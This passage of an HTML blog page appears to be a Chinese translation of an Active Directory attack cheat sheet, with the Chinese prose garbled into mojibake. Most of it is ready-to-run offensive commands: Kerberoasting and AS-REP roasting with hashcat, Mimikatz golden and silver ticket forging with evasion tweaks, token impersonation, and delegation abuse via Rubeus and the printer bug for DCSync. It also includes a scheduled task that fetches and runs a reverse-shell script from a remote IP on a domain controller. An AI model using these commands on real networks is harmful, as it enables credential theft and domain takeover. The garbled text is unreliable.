åœ¨æ‚¨å¯ä»¥è®¿é—®çš„æœºå™¨ä¸Šæœå¯»æœ‰è¶£çš„ç”¨æˆ·ä¼šè¯ (still noisy ğŸš©)</span></span><br><span class="line">Invoke-UserHunter -CheckAccess | ?&#123;<span class="variable">$_</span>.LocalAdmin <span class="nomarkup">-Eq</span> True &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯»æ‰¾ kerberoastable users</span></span><br><span class="line">Get-DomainUser -SPN | select name,serviceprincipalname</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯»æ‰¾ AS-REP roastable users</span></span><br><span class="line">Get-DomainUser -PreauthNotRequired | select name</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯»æ‰¾å¯ä»¥è®¾ç½®UserAccountControlæ ‡å¿—çš„ç”¨æˆ·</span></span><br><span class="line"><span class="comment">## å¦‚æœå¯ç”¨-ç¦ç”¨é¢„èº«ä»½éªŒè¯æˆ–æ·»åŠ SPNï¼ˆè¯·å‚è§ä¸‹æ–‡ï¼‰</span></span><br><span class="line">Invoke-ACLScanner -ResolveGUIDs | ?&#123;<span class="variable">$_</span>.IdentityReferenceName <span class="nomarkup">-match</span> <span class="string">"RDPUsers"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥æ‰¾å¯ç”¨äº†æ— é™åˆ¶å§”æ´¾çš„æœåŠ¡å™¨</span></span><br><span class="line"><span class="comment">## å¦‚æœå¯ç”¨ï¼Œå¹¶ä¸”æ‚¨åœ¨æ­¤æœåŠ¡å™¨ä¸Šå…·æœ‰ç®¡ç†å‘˜æƒé™ï¼Œè¯·è·å–ç”¨æˆ·TGTï¼ˆè¯·å‚è§ä¸‹æ–‡ï¼‰</span></span><br><span class="line">Get-DomainComputer -Unconstrained</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥æ‰¾å¯ç”¨äº†çº¦æŸå§”æ´¾çš„ç”¨æˆ·æˆ–è®¡ç®—æœº</span></span><br><span class="line"><span class="comment">## å¦‚æœå¯ç”¨ï¼Œå¹¶ä¸”æ‚¨å…·æœ‰ç”¨æˆ·/è®¡ç®—æœºå“ˆå¸Œï¼Œè¯·ä»¥DAèº«ä»½è®¿é—®æœåŠ¡æœºï¼ˆè¯·å‚è§ä¸‹æ–‡ï¼‰</span></span><br><span class="line">Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegateto</span><br><span class="line">Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto</span><br></pre></td></tr></table></figure><h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><p>ä½¿ç”¨<code>Invoke-BloodHound</code>from<code>SharpHound.ps1</code>æˆ–use <code>SharpHound.exe</code>ã€‚ä¸¤è€…éƒ½å¯ä»¥åæ€åœ°è¿è¡Œï¼ŒæŠŠå®ƒä»¬æ”¾åˆ°<a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors" target="_blank" rel="noopener">è¿™é‡Œ</a>ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¦‚æœæ‚¨ä¸å…³å¿ƒOpSecï¼Œè¯·è¿è¡Œæ‰€æœ‰æ£€æŸ¥ğŸš©</span></span><br><span class="line">Invoke-BloodHound -CollectionMethod All,GPOLocalGroup</span><br><span class="line"></span><br><span class="line"><span class="comment"># Running LoggedOn separately sometimes gives you more sessions, but enumerates by looping through hosts ğŸš©</span></span><br><span class="line">Invoke-BloodHound -CollectionMethod LoggedOn</span><br></pre></td></tr></table></figure><h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><h4 id="Automatic"><a href="#Automatic" class="headerlink" title="Automatic"></a>Automatic</h4><p>ä½¿ç”¨PowerViewï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Request-SPNTicket -SPN <span class="string">"MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨Hashcatç ´è§£å“ˆå¸Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 13100 hash.txt `<span class="built_in">pwd</span>`/rockyou.txt --rules-file `<span class="built_in">pwd</span>`/hashcat/rules/best64.rule</span><br></pre></td></tr></table></figure><h4 id="Manual"><a href="#Manual" class="headerlink" title="Manual"></a>Manual</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¯·æ±‚TGSè¿›è¡Œkerberoastableå¸æˆ·ï¼ˆSPNï¼‰</span></span><br><span class="line"><span class="built_in">Add-Type</span> -AssemblyName System.IdentityModel</span><br><span class="line"><span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <span class="string">"MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†TGSè½¬å‚¨åˆ°ç£ç›˜</span></span><br><span class="line">Invoke-Mimikatz -Command <span class="string">'"kerberos::list /export"'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨TGSRepCrackç ´è§£</span></span><br><span class="line">python.exe .\tgsrepcrack.py .\<span class="number">10</span>k-worst-pass.txt .\mssqlsvc.kirbi</span><br></pre></td></tr></table></figure><h4 id="Targeted-kerberoasting-by-setting-SPN"><a href="#Targeted-kerberoasting-by-setting-SPN" class="headerlink" title="Targeted kerberoasting by setting SPN"></a>Targeted kerberoasting by setting SPN</h4><p>æˆ‘ä»¬éœ€è¦ACLå†™å…¥æƒé™æ‰èƒ½ä¸ºè¯¥ç”¨æˆ·è®¾ç½®UserAccountControlæ ‡å¿—ï¼Œæœ‰å…³æœç´¢ï¼Œè¯·å‚è§ä¸Šæ–‡ã€‚ä½¿ç”¨PowerViewï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainObject -Identity support355user -Set @&#123;serviceprincipalname=<span class="string">'any/thing'</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="AS-REP-roasting"><a href="#AS-REP-roasting" class="headerlink" title="AS-REP roasting"></a>AS-REP roasting</h3><p>è·å–å¯ç„™çƒ¤ç”¨æˆ·çš„å“ˆå¸Œï¼ˆæœ‰å…³æœç´¢ï¼Œè¯·å‚è§ä¸Šæ–‡ï¼‰ã€‚ä½¿ç”¨<code>ASREPRoast.ps1</code>ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ASREPHash -UserName VPN355user</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨Hashcatç ´è§£å“ˆå¸Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 18200 hash.txt `<span class="built_in">pwd</span>`/rockyou.txt --rules-file `<span class="built_in">pwd</span>`/hashcat/rules/best64.rule</span><br></pre></td></tr></table></figure><h4 id="é€šè¿‡ç¦ç”¨Kerberosé¢„èº«ä»½éªŒè¯è¿›è¡Œæœ‰é’ˆå¯¹æ€§çš„AS-REPæ¼«æ¸¸"><a href="#é€šè¿‡ç¦ç”¨Kerberosé¢„èº«ä»½éªŒè¯è¿›è¡Œæœ‰é’ˆå¯¹æ€§çš„AS-REPæ¼«æ¸¸" class="headerlink" title="é€šè¿‡ç¦ç”¨Kerberosé¢„èº«ä»½éªŒè¯è¿›è¡Œæœ‰é’ˆå¯¹æ€§çš„AS-REPæ¼«æ¸¸"></a><strong>é€šè¿‡ç¦ç”¨Kerberosé¢„èº«ä»½éªŒè¯è¿›è¡Œæœ‰é’ˆå¯¹æ€§çš„AS-REPæ¼«æ¸¸</strong></h4><p>æˆ‘ä»¬éœ€è¦ACLå†™å…¥æƒé™æ‰èƒ½ä¸ºè¯¥ç”¨æˆ·è®¾ç½®UserAccountControlæ ‡å¿—ï¼Œæœ‰å…³æœç´¢ï¼Œè¯·å‚è§ä¸Šæ–‡ã€‚ä½¿ç”¨PowerViewã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainObject -Identity Control355User -XOR @&#123;useraccountcontrol=<span class="number">4194304</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="Token-Manipulation"><a href="#Token-Manipulation" class="headerlink" title="Token Manipulation"></a>Token Manipulation</h3><p>å¯ä»¥é€šè¿‡è®¡ç®—æœºä¸Šçš„ä¼šè¯/è¿è¡Œè¿›ç¨‹ä»å…¶ä»–ç”¨æˆ·æ¨¡ä»¿ä»¤ç‰Œã€‚é€šè¿‡ä½¿ç”¨ä¾‹å¦‚CobaltStrikeæ³¨å…¥åˆ°æ‰€è¿°è¿‡ç¨‹ä¸­å¯ä»¥å®ç°ç±»ä¼¼çš„æ•ˆæœã€‚</p><h4 id="Incognito"><a href="#Incognito" class="headerlink" title="Incognito"></a>Incognito</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åœ¨æœºå™¨ä¸Šæ˜¾ç¤ºä»¤ç‰Œ</span></span><br><span class="line">.\incognito.exe list_tokens -u</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ç‰¹å®šç”¨æˆ·çš„ä»¤ç‰Œå¯åŠ¨æ–°è¿‡ç¨‹</span></span><br><span class="line">.\incognito.exe execute -c <span class="string">"domain\user"</span> C:\Windows\system32\calc.exe</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœæ‚¨ä½¿ç”¨Meterpreterï¼Œåˆ™å¯ä»¥å°†å†…ç½®çš„Incognitoæ¨¡å—ä¸ä¸€èµ·ä½¿ç”¨ï¼Œå¯ä»¥ä½¿ç”¨<code>use incognito</code>ç›¸åŒçš„å‘½ä»¤ã€‚</p></blockquote><h4 id="Invoke-TokenManipulation"><a href="#Invoke-TokenManipulation" class="headerlink" title="Invoke-TokenManipulation"></a>Invoke-TokenManipulation</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ˜¾ç¤ºæœºå™¨ä¸Šçš„æ‰€æœ‰ä»¤ç‰Œ</span></span><br><span class="line">Invoke-TokenManipulation -ShowAll</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»…åœ¨æœºå™¨ä¸Šæ˜¾ç¤ºå”¯ä¸€çš„ï¼Œå¯ç”¨çš„ä»¤ç‰Œ</span></span><br><span class="line">Invoke-TokenManipulation -Enumerate</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ç‰¹å®šç”¨æˆ·çš„ä»¤ç‰Œå¯åŠ¨æ–°è¿‡ç¨‹</span></span><br><span class="line">Invoke-TokenManipulation -ImpersonateUser -Username <span class="string">"domain\user"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨å¦ä¸€ä¸ªè¿›ç¨‹çš„ä»¤ç‰Œå¯åŠ¨æ–°è¿›ç¨‹</span></span><br><span class="line">Invoke-TokenManipulation -CreateProcess <span class="string">"C:\Windows\system32\calc.exe"</span> -ProcessId <span class="number">500</span></span><br></pre></td></tr></table></figure><h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Overpass the hash</span><br><span class="line">sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:[NTLMHASH] /run:powershell.exe</span><br><span class="line"></span><br><span class="line"># é»„é‡‘ç¥¨æ® (domain admin, w/ some ticket properties to avoid detection)</span><br><span class="line">kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt</span><br><span class="line"></span><br><span class="line"># ç™½é“¶ç¥¨æ® for a specific SPN with a compromised service / machine account</span><br><span class="line">kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.domain.local /service:HOST /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt</span><br></pre></td></tr></table></figure><blockquote><p>å¯åœ¨<a href="https://adsecurity.org/?page_id=183" target="_blank" rel="noopener">æ­¤å¤„</a>æ‰¾åˆ°ç”¨äºé“¶ç¥¨çš„å¯ç”¨SPNåˆ—è¡¨ã€‚<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Active Directory Attack.md#pass-the-ticket-silver-tickets" target="_blank" rel="noopener">è¿™é‡Œ</a>æä¾›<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Active Directory Attack.md#pass-the-ticket-silver-tickets" target="_blank" rel="noopener">äº†</a>ä¸æ”»å‡»ç›¸å…³çš„SPNçš„å¦ä¸€ä¸ªä¸é”™çš„æ¦‚è¿°ã€‚</p></blockquote><h3 id="ä½¿ç”¨schtasksæ‰§è¡Œå‘½ä»¤"><a href="#ä½¿ç”¨schtasksæ‰§è¡Œå‘½ä»¤" class="headerlink" title="ä½¿ç”¨schtasksæ‰§è¡Œå‘½ä»¤"></a><strong>ä½¿ç”¨schtasksæ‰§è¡Œå‘½ä»¤</strong></h3><p><em>éœ€è¦â€œä¸»æœºâ€ SPN</em></p><p>åˆ›å»ºä»»åŠ¡ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ³¨æ„å¼•å·ã€‚å¦‚æœå¼•ç”¨å˜å¾—å¾ˆç—›è‹¦ï¼Œè¯·ä½¿ç”¨ç¼–ç çš„å‘½ä»¤ã€‚</span></span><br><span class="line">schtasks /create /tn <span class="string">"shell"</span> /ru <span class="string">"NT Authority\SYSTEM"</span> /s dcorp-dc.dollarcorp.moneycorp.local /sc weekly /tr <span class="string">"Powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1''')'"</span></span><br></pre></td></tr></table></figure><p>è§¦å‘å®ƒï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /RUN /TN <span class="string">"shell"</span> /s dcorp-dc.dollarcorp.moneycorp.local</span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨WMIæ‰§è¡Œå‘½ä»¤"><a href="#ä½¿ç”¨WMIæ‰§è¡Œå‘½ä»¤" class="headerlink" title="ä½¿ç”¨WMIæ‰§è¡Œå‘½ä»¤"></a><strong>ä½¿ç”¨WMIæ‰§è¡Œå‘½ä»¤</strong></h3><p><em>éœ€è¦â€œä¸»æœºâ€å’Œâ€œ RPCSSâ€ SPN</em></p><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WmiMethod</span> win32_process -ComputerName dcorp-dc.dollarcorp.moneycorp.local -name create -argumentlist <span class="string">"powershell.exe -e <span class="variable">$encodedCommand</span>"</span></span><br></pre></td></tr></table></figure><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨password</span></span><br><span class="line">impacket-wmiexec dcorp/student355:password@172.16.4.101</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨hash</span></span><br><span class="line">impacket-wmiexec dcorp/student355@172.16.4.101 -hashes :92F4AE6DCDAC7CF870B79F1758503D54</span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨PowerShell-Remotingæ‰§è¡Œå‘½ä»¤"><a href="#ä½¿ç”¨PowerShell-Remotingæ‰§è¡Œå‘½ä»¤" class="headerlink" title="ä½¿ç”¨PowerShell Remotingæ‰§è¡Œå‘½ä»¤"></a><strong>ä½¿ç”¨PowerShell Remotingæ‰§è¡Œå‘½ä»¤</strong></h3><p><em>éœ€è¦â€œ CIFSâ€ï¼Œâ€œ HTTPâ€å’Œâ€œ WSMANâ€ SPN</em></p><blockquote><p>è¿™ä¸ªæœ‰ç‚¹æ£˜æ‰‹ã€‚ä¸Šè¿°SPNçš„ç»„åˆå¯èƒ½æœ‰æ•ˆæˆ–æ— æ•ˆ-PowerShellä¹Ÿå¯èƒ½è¦æ±‚æä¾›å‡†ç¡®çš„FQDNã€‚</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºå‡­æ®ä»¥å…¶ä»–ç”¨æˆ·èº«ä»½è¿è¡Œï¼ˆå¦‚æœéœ€è¦ï¼ŒPTTä¸éœ€è¦ï¼‰</span></span><br><span class="line"><span class="comment"># å¦‚æœä¸ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼Œè¯·åœ¨ä»¥ä¸‹å‘½ä»¤ä¸­å¿½ç•¥-Credential $ Cred</span></span><br><span class="line"><span class="variable">$SecPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">'thePassword'</span> -AsPlainText -Force</span><br><span class="line"><span class="variable">$Cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">'CORP\username'</span>, <span class="variable">$SecPassword</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿œç¨‹è¿è¡Œå‘½ä»¤ï¼ˆå¯ä»¥ä¸€å¯¹å¤šä½¿ç”¨ï¼ï¼‰</span></span><br><span class="line"><span class="built_in">Invoke-Command</span> -Credential <span class="variable">$Cred</span> -ComputerName <span class="variable">$computer</span> -ScriptBlock &#123;whoami; hostname&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»¥å…¶ä»–ç”¨æˆ·èº«ä»½å¯åŠ¨ä¼šè¯ï¼ˆæç¤ºè¾“å…¥å¯†ç ï¼‰</span></span><br><span class="line"><span class="built_in">Enter-PsSession</span> -Credential <span class="variable">$Cred</span> -ComputerName <span class="variable">$computer</span> -Credential dcorp\Administrator</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªæŒä¹…ä¼šè¯ï¼ˆå°†è®°ä½å˜é‡ç­‰ï¼‰ï¼Œå°†è„šæœ¬åŠ è½½åˆ°è¯¥ä¼šè¯ä¸­ï¼Œç„¶åè¾“å…¥è¿œç¨‹ä¼šè¯æç¤º</span></span><br><span class="line"><span class="variable">$sess</span> = <span class="built_in">New-PsSession</span> -Credential <span class="variable">$Cred</span></span><br><span class="line"><span class="built_in">Invoke-Command</span> -Session <span class="variable">$sess</span> -FilePath c:\path\to\file.ps1</span><br><span class="line"><span class="built_in">Enter-PsSession</span> -Session <span class="variable">$sess</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨æ´»åŠ¨çš„PowerShellè¿œç¨‹ä¼šè¯ä¹‹é—´å¤åˆ¶æ–‡ä»¶æˆ–ä»ä¸­å¤åˆ¶æ–‡ä»¶</span></span><br><span class="line"><span class="built_in">Copy-Item</span> -Path .\Invoke-Mimikatz.ps1 -ToSession <span class="variable">$sess2</span> -Destination <span class="string">"C:\Users\dbprodadmin\documents\"</span></span><br></pre></td></tr></table></figure><h3 id="ä¸å—é™åˆ¶çš„å§”æ‰˜"><a href="#ä¸å—é™åˆ¶çš„å§”æ‰˜" class="headerlink" title="ä¸å—é™åˆ¶çš„å§”æ‰˜"></a><strong>ä¸å—é™åˆ¶çš„å§”æ‰˜</strong></h3><p>å¯ä»¥åœ¨<em>å‰ç«¯æœåŠ¡</em>ï¼ˆä¾‹å¦‚IIS WebæœåŠ¡å™¨ï¼‰ä¸Šè®¾ç½®ï¼Œä»¥å…è®¸å®ƒä»£è¡¨ç”¨æˆ·å§”æ´¾<em>åŸŸä¸­çš„ä»»ä½•æœåŠ¡</em>ï¼ˆå‘<em>åç«¯æœåŠ¡</em>ï¼ˆä¾‹å¦‚MSSQLæ•°æ®åº“ï¼‰ï¼‰ã€‚</p><p>DACL UACå±æ€§ï¼š <code>TrustedForDelegation</code>.</p><h4 id="Exploitation-1"><a href="#Exploitation-1" class="headerlink" title="Exploitation"></a>Exploitation</h4><p>åœ¨è®¾ç½®äº†æ— é™åˆ¶å§”æ´¾çš„æœåŠ¡å™¨ä¸Šå…·æœ‰ç®¡ç†ç‰¹æƒæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºå…·æœ‰è¿æ¥çš„å…¶ä»–ç”¨æˆ·è½¬å‚¨TGTã€‚ä½¿ç”¨Mimikatzï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::tickets /export</span><br><span class="line">kerberos::ptt c:\path\to\ticket.kirbi</span><br></pre></td></tr></table></figure><p>æˆ–ä¸Rubeusä¸€èµ·ä½¿ç”¨</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe klist</span><br><span class="line">.\Rubeus.exe dump /luid:<span class="number">0</span>x5379f2 /nowrap</span><br><span class="line">.\Rubeus.exe ptt /ticket:doIFSDCC[...]</span><br></pre></td></tr></table></figure><p>å¦‚æœè¯¥DCå®¹æ˜“å—åˆ°æ‰“å°æœºé”™è¯¯çš„å½±å“ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥è·å¾—åŸŸæ§åˆ¶å™¨è®¡ç®—æœºå¸æˆ·çš„å“ˆå¸Œå€¼ã€‚åœ¨å…·æœ‰æ— é™åˆ¶å§”æ´¾çš„æœåŠ¡å™¨ä¸Šï¼Œä½¿ç”¨Rubeusç›‘è§†æ–°ç¥¨è¯ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe monitor /interval:<span class="number">5</span> /nowrap</span><br></pre></td></tr></table></figure><p>ä»æ”»å‡»æœºä¸Šè¯±ä½¿åŸŸæ§åˆ¶å™¨ä½¿ç”¨æ‰“å°æœºé”™è¯¯è¿›è¡Œè¿æ¥ã€‚ä»<a href="https://github.com/leechristensen/SpoolSample" target="_blank" rel="noopener">è¿™é‡Œ</a>äºŒè¿›åˆ¶ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local</span><br></pre></td></tr></table></figure><p>DCçš„æœºå™¨å¸æˆ·çš„TGTåº”è¯¥åœ¨ç¬¬ä¸€ä¸ªä¼šè¯ä¸­å‡ºç°ã€‚æˆ‘ä»¬å¯ä»¥ä¼ é€’æ­¤ç¥¨è¯ä»¥è·å¾—DCSyncç‰¹æƒã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe ptt /ticket:doIFxTCCBc...</span><br></pre></td></tr></table></figure><h3 id="çº¦æŸå§”æ´¾"><a href="#çº¦æŸå§”æ´¾" class="headerlink" title="çº¦æŸå§”æ´¾"></a><strong>çº¦æŸå§”æ´¾</strong></h3><p>å¯ä»¥åœ¨<em>å‰ç«¯æœåŠ¡å™¨</em>ï¼ˆä¾‹å¦‚IISï¼‰ä¸Šè®¾ç½®çº¦æŸå§”æ´¾ï¼Œä»¥å…è®¸å®ƒä»£è¡¨ç”¨æˆ·<em>ä»…</em>å§”æ´¾ç»™<em>é€‰å®šçš„åç«¯æœåŠ¡</em>ï¼ˆä¾‹å¦‚MSSQLï¼‰ã€‚</p><p>DACL UACå±æ€§ï¼š<code>TrustedToAuthForDelegation</code>ã€‚è¿™å…è®¸<code>s4u2self</code>ï¼ˆå³ï¼Œä»…ä½¿ç”¨NTLMå¯†ç å“ˆå¸Œå€¼ï¼‰ä»£è¡¨<em>ä»»ä½•äºº</em>è‡ªå·±è¯·æ±‚TGS ã€‚è¿™æœ‰æ•ˆåœ°å…è®¸è¯¥æœåŠ¡ä»…ä½¿ç”¨ä»–ä»¬çš„å“ˆå¸Œæ¥æ¨¡æ‹ŸåŸŸä¸­çš„å…¶ä»–ç”¨æˆ·ï¼Œå¹¶ä¸”åœ¨ç”¨æˆ·å’Œå‰ç«¯ä¹‹é—´ä¸ä½¿ç”¨Kerberosçš„æƒ…å†µä¸‹éå¸¸æœ‰ç”¨ã€‚</p><p>DACLå±æ€§ï¼š<code>msDS-AllowedToDelegateTo</code>ã€‚æ­¤å±æ€§åŒ…å«å…è®¸åœ¨å…¶ä¸Šä½¿ç”¨çš„SPN <code>s4u2proxy</code>ï¼Œå³åŸºäºç°æœ‰TGSï¼ˆä¾‹å¦‚ï¼Œä»ä¸­ä½¿ç”¨æ‰€è·å¾—çš„TGSï¼‰è¯·æ±‚è¯¥æœåŠ¡å™¨çš„å¯è½¬å‘TGS <code>s4u2self</code>ã€‚è¿™æœ‰æ•ˆåœ°å®šä¹‰äº†å…è®¸å§”æ´¾å§”æ´¾çš„åç«¯æœåŠ¡ã€‚</p><p><strong>æ³¨æ„ï¼š</strong>è¿™äº›å±æ€§ä¸ä¸€å®šå¿…é¡»å¹¶å­˜ï¼å¦‚æœ<code>s4u2proxy</code>ä¸å…è®¸ä½¿ç”¨<code>s4u2self</code>ï¼Œåˆ™éœ€è¦ç”¨æˆ·äº¤äº’æ‰èƒ½ä»ç”¨æˆ·è·å¾—æœ‰æ•ˆçš„TGSåˆ°å‰ç«¯æœåŠ¡ï¼Œç±»ä¼¼äºæ— çº¦æŸå§”æ´¾ã€‚</p><h4 id="Exploitation-2"><a href="#Exploitation-2" class="headerlink" title="Exploitation"></a>Exploitation</h4><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨Rubeusè‡ªåŠ¨è¯·æ±‚TGTï¼Œç„¶åä½¿ç”¨å¸¦æœ‰<code>ldap</code>SPNçš„TGSï¼Œä»¥å…è®¸æˆ‘ä»¬ä½¿ç”¨è®¡ç®—æœºå¸æˆ·è¿›è¡ŒDCSyncã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Get a TGT using the compromised service account with delegation set (if needed)</span></span><br><span class="line">.\Rubeus.exe asktgt /user:sa_with_delegation /domain:domain.com /rc4:<span class="number">2892</span>D26CDF84D7A70E2EB3B9F05C425E</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use s4u2self and s4u2proxy to impersonate the DA user to the allowed SPN</span></span><br><span class="line">.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:Administrator /msdsspn:time/dc /ptt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Same as above, but access the LDAP service on the DC (for dcsync) using pw hash</span></span><br><span class="line">.\Rubeus.exe s4u /user:sa_with_delegation /impersonateuser:Administrator /msdsspn:time/dc /altservice:ldap /ptt /rc4:<span class="number">2892</span>D26CDF84D7A70E2EB3B9F05C425E</span><br></pre></td></tr></table></figure><h3 id="åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾"><a href="#åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾" class="headerlink" 